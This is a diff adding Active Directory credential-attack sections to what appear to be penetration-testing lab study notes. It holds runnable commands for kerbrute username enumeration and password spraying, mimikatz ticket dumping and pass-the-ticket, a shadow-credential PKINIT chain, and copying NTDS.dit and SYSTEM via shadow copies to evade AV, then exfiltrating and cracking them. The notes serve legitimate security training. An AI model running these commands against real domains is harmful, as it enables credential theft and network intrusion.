@@ -85,3 +85,92 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 → On Go's `filepath.Join(uploadDir, filename)` on Windows: `//server/` is treated as an absolute UNC path discarding uploadDir. Backslash form may be filtered; forward slashes often aren't.
 → Confirm the server does minimal path sanitisation first: `curl http://<target>/nul` → 200 OK (Windows NUL device passes through), `curl http://<target>/aux` → hangs (AUX serial port device). If both fire, the handler isn't sanitising device names, making UNC injection likely viable.
 → Full story: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 VM #2]]
+
+---
+
+## Active Directory — Credential Attacks
+
+### Need to validate a list of potential AD usernames before spraying
+
+→ Use **kerbrute** against the DC's Kerberos port (88) — no account lockout risk with `userenum`, no auth required:
+```bash
+kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/wordlists/xato-net-10-million-usernames.txt
+```
+→ Generate realistic username formats from a name list first with **username-anarchy**:
+```bash
+username-anarchy -i names.txt > candidate_users.txt
+kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
+```
+→ Once you have valid usernames, spray with kerbrute (careful — `bruteuser`/`passwordspray` DO count against lockout policy):
+```bash
+kerbrute bruteuser -d <domain> --dc <DC-IP> valid_users.txt 'Password123!'
+```
+→ Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute — Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
+
+---
+
+### Got a Kerberos ticket (TGT or TGS) — which pass-the-ticket path applies?
+
+**Windows — .kirbi file on a Windows box:**
+```
+privilege::debug
+sekurlsa::tickets /export          # dumps all tickets to .kirbi files
+kerberos::ptt <ticket.kirbi>       # inject into current session
+```
+Then use the impersonated identity directly: `dir \\target\share`, `PsExec.exe \\target cmd`
+
+**Linux — .ccache file on a Linux box (or via keytabextract):**
+```bash
+ls -la /tmp/krb5cc_*               # find existing ccache files
+export KRB5CCNAME=/tmp/krb5cc_<id> # activate it
+smbclient -k -N //target/share     # use it (no password needed)
+```
+If you have a `.keytab` instead of a `.ccache`: extract with `keytabextract.py <file.keytab>`, then `kinit <user>@DOMAIN` to get a TGT.
+
+→ Key rule: TGTs let you request any TGS (full impersonation); a TGS only works for the single service it was issued for.
+→ Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket — Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket — Linux|PA.16]]
+
+---
+
+### Got write access to an AD computer object — escalation path
+
+→ This is the **Pass the Certificate (PtC)** chain. Write access to a computer object (or `ms-DS-KeyCredentialLink`) lets you add a shadow credential and get a TGT without knowing the machine account password.
+
+**The chain:**
+```bash
+# 1. Add shadow credential (requires write access to the object)
+python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <victim-machine$> --action add
+
+# 2. Convert the pfx to a format gettgtpkinit.py accepts
+# (pywhisker outputs the pfx password and file path)
+
+# 3. Get TGT via PKINIT
+python3 gettgtpkinit.py <domain>/<victim-machine$> out.ccache -cert-pfx <file.pfx> -pfx-pass <password>
+
+# 4. Activate the TGT and use evil-winrm (or smbclient -k, etc.)
+export KRB5CCNAME=out.ccache
+evil-winrm -i <target> -r <domain>
+```
+→ Prerequisite: oscrypto version pin may be needed (`pip3 install oscrypto==1.3.0`) if you get `ValueError: required TLS connection info not available`.
+→ Full reference: [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificate (PtC)|PA.17]]
+
+---
+
+### Need NTDS.dit but can't run Mimikatz or secretsdump directly
+
+→ Use **Volume Shadow Copy** — doesn't touch the live NTDS.dit file, so AV/EDR is less likely to catch it:
+```cmd
+vssadmin CREATE SHADOW /For=C:
+:: Note the shadow copy path, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM   :: alternative if VSS copy of SYSTEM fails
+```
+Then exfil both files and crack offline:
+```bash
+secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
+```
+→ Alternative (remote, one-liner): `nxc smb <target> -u admin -p pass --ntds` runs VSS automatically.
+→ Full reference: [[Password Attacks (HTB Supplementary)#PA.13 NTDS.dit via Volume Shadow Copy|PA.13]]
+
+#### Tags: #DecisionTree #Credentials #PassTheTicket #PassTheCertificate #NTDS #kerbrute #ActiveDirectory
